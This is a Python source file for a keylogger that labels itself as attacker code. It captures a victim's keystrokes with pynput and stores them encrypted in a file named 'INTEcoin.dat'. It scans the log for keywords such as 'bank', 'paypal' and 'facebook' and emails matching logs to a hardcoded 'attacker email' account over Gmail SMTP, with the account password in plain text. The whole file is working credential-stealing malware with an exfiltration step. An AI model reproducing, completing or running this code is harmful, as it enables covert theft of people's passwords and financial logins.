from encryption import Encryption
from pynput.keyboard import Key
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

# Settings
KEYWORDS = ["bank", "hmo", "facebook", "mail", "paypal"] # Lowercase keywords
KEYSTROKES_BUFFER_SIZE = 20  # How many keystrokes before saving
SAVES_BUFFER_SIZE = 2 # How many saves before sending
EMAIL_USER = "intelogger@gmail.com" # Attacker email
EMAIL_PASSWORD = "Aa!12345" # Attacker password

class Keylogger():
    _keys = []
    _keystrokes_count = 0
    _saves_count = 0
    _logs_count = 1

    def press(self, key):
        """
        Activated by the listener every key press.
        Checks counters and sends the data to the logging function.
        :param key: The key pressed given from pynput module.
        """
        self._keys.append(key)  # Appends every pressed key
        self._keystrokes_count += 1  # Keeps track of keystrokes count
        if self._keystrokes_count >= KEYSTROKES_BUFFER_SIZE:
            self._writer(self._keys)
            self._keystrokes_count = 0
            self._keys = []
            self._saves_count += 1
        if self._saves_count >= SAVES_BUFFER_SIZE:
            self._saves_count = 0
            self._results()


    def _writer(self, log):
        """
        Saves the log in a dat file.
        :param log: An array of pressed keys.
        """
        with open("logs/INTEcoin.dat", "ab") as file:
            toWrite = ""
            for i, key in enumerate(log): # Removes repeated spaces and enters
                if i > 0:
                    if str(key) == "Key.space" and str(log[i - 1]) == "Key.space":
                        continue
                    if str(key) == "Key.enter" and str(log[i - 1]) == "Key.enter":
                        continue
                key = self._parse(key) # Converts the key to a readable character
                toWrite += key
            file.write(Encryption.encrypt(toWrite))
            file.write(b"@")  # Puts a separator for the encryption diod see Fernet using this as the cypher text
            file.close()


    def _parse(self, key):
        """
        Takes a string of a key pressed and makes it human readable.
        :param key: A string to parse into readable format.
        :return: The key as readable as possible.
        """
        key = str(key)
        if key == "'":  # Handles the ' sign
            return key
        key = key.replace("'", "")  # Deletes ' ' from output
        if key == "Key.enter" or key == "Key.space":
            return "\n"
        if "Key" in key:
            return key + " " # If it has a "Key" parameter before it adds a space to make it more readable
        return key


    def _results(self):
        """
        Steal logic function.
        INTEcoin - Holds the encrypted data which deletes after the function finishes copying the file.
        """
        send_flag = False # File has one of the keywords flag
        keywords_contained = [] # Keywords found in the log
        chunk = ""
        decrypted_log = ""

        for byt in Encryption.bytes_from_file("logs/INTEcoin.dat"): # Reads stolen data file as chunks and save them in a list
            if byt == "@":
                decrypted_log += Encryption.decrypt(chunk.encode())
                chunk = ""
                continue
            chunk += byt

        for word in KEYWORDS: # Checks if any sensitive data was inputted
            if word in decrypted_log:
                send_flag = True
                keywords_contained.append(word)
        if send_flag:
            self._send(keywords_contained)  # Sends the encrypted data
        os.remove("logs/INTEcoin.dat") # Deletes the file to avoid sending the same data again


    def _send(self, keywords_contained):
        """
        Sends the data via email.
        """
        
        # Creates the message
        msg = MIMEMultipart()
        msg['From'] = EMAIL_USER
        msg['To'] = EMAIL_USER
        msg['Subject'] = "New Keylogger Logs"
        msg.attach(MIMEText("Log number {}".format(self._logs_count) + "\n Contains: {}".format(str(keywords_contained)), 'plain'))
        self._logs_count += 1
        
        # Attaches the encrypted log file
        fileName = "INTEcoin.dat"
        attachment = open("logs/" + fileName, "rb") 
        
        # Creates a MIMEBase instance
        mb = MIMEBase('application', 'octet-stream')
        mb.set_payload((attachment).read())
        encoders.encode_base64(mb)
        mb.add_header('Content-Disposition', "attachment; filename= %s" % fileName)
        msg.attach(mb) # Attach 'mb' to 'msg'
        
        # Creates a STMP session
        smtp = smtplib.SMTP('smtp.gmail.com', 587)
        smtp.starttls()
        smtp.login(EMAIL_USER, EMAIL_PASSWORD) # E-Mail login credentials
        
        smtp.sendmail(EMAIL_USER, EMAIL_USER, msg.as_string()) # Sends the email
        smtp.quit() # Terminates the STMP session
